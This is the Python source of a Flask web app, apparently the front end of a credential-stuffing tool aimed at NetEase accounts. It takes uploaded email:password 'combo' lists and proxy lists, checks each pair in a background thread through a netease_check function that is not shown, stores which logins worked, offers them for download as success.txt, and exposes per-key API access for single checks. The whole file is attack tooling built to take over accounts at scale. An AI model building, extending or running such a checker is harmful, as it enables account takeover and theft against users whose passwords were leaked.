import os
import threading
from flask import Flask, render_template, request, redirect, url_for, flash, session, send_file
from models import users_db, results_db, stats, proxies_list, combo_lines, add_result, update_stats
from utils import netease_check, process_combo
from functools import wraps

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'dev-secret-key')

# ------------------ DECORATORS ------------------
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            flash('Please log in first.', 'warning')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session or session.get('role') != 'admin':
            flash('Admin access required.', 'danger')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

# ------------------ ROUTES ------------------
@app.route('/')
def index():
    return render_template('index.html', stats=stats, results=results_db[-20:],
                           proxies='\n'.join(proxies_list) if proxies_list else '',
                           api_key=users_db.get(session.get('username', {}), {}).get('api_key', ''))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = users_db.get(username)
        if user and user.check_password(password):
            session['username'] = username
            session['role'] = user.role
            flash('Logged in successfully.', 'success')
            return redirect(url_for('index'))
        flash('Invalid credentials.', 'danger')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        if username in users_db:
            flash('Username already exists.', 'danger')
        else:
            from models import User
            users_db[username] = User(username, email, password)
            flash('Registration successful. Please log in.', 'success')
            return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/logout')
def logout():
    session.clear()
    flash('Logged out.', 'info')
    return redirect(url_for('login'))

@app.route('/upload', methods=['POST'])
@login_required
def upload_combo():
    file = request.files.get('combo')
    if not file:
        flash('No file uploaded.', 'danger')
        return redirect(url_for('index'))
    content = file.read().decode('utf-8', errors='ignore')
    lines = [l.strip() for l in content.splitlines() if l.strip() and ':' in l]
    if not lines:
        flash('No valid email:password lines found.', 'danger')
        return redirect(url_for('index'))
    global combo_lines
    combo_lines = lines
    flash(f'Uploaded {len(lines)} accounts. Starting checker...', 'success')
    thread = threading.Thread(target=process_combo, args=(lines, add_result, update_stats, proxies_list))
    thread.daemon = True
    thread.start()
    return redirect(url_for('index'))

@app.route('/proxy', methods=['POST'])
@login_required
def load_proxies():
    global proxies_list
    proxy_text = request.form.get('proxies', '')
    proxies_list = [p.strip() for p in proxy_text.splitlines() if p.strip()]
    flash(f'Loaded {len(proxies_list)} proxies.', 'success')
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html', stats=stats, results=results_db[-30:])

@app.route('/admin')
@admin_required
def admin_panel():
    return render_template('admin.html', users=users_db)

@app.route('/admin/generate', methods=['POST'])
@admin_required
def generate_api():
    user_id = request.form.get('user_id')
    if user_id not in users_db:
        flash('User not found.', 'danger')
        return redirect(url_for('admin_panel'))
    new_key = users_db[user_id].regenerate_api_key()
    flash(f'New API key generated for {user_id}.', 'success')
    return redirect(url_for('admin_panel'))

@app.route('/api')
@login_required
def api_page():
    api_key = users_db.get(session['username'], {}).get('api_key', '')
    return render_template('api.html', api_key=api_key)

@app.route('/download/<type>')
@login_required
def download(type):
    if type == 'success':
        lines = [r['account'] for r in results_db if r['status'] == 'success']
        filename = 'success.txt'
    else:
        lines = [f"{r['account']} | {r['status']} | {r['detail']}" for r in results_db]
        filename = 'all_results.txt'
    if not lines:
        flash('No results to download.', 'warning')
        return redirect(url_for('index'))
    content = '\n'.join(lines)
    return app.response_class(content, mimetype='text/plain',
                              headers={'Content-Disposition': f'attachment;filename={filename}'})

# ------------------ API ENDPOINT ------------------
@app.route('/api/check', methods=['POST'])
def api_check():
    from flask import request, jsonify
    api_key = request.headers.get('X-API-Key')
    if not api_key:
        return jsonify({'error': 'Missing API key'}), 401
    user = None
    for u in users_db.values():
        if u.api_key == api_key:
            user = u
            break
    if not user:
        return jsonify({'error': 'Invalid API key'}), 401
    data = request.get_json()
    if not data or 'account' not in data:
        return jsonify({'error': 'Missing account field'}), 400
    account = data['account']
    if ':' not in account:
        return jsonify({'error': 'Invalid format. Use email:password'}), 400
    email, password = account.split(':', 1)
    status, detail = netease_check(email, password, proxies_list)
    return jsonify({'status': status, 'detail': detail, 'account': account})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)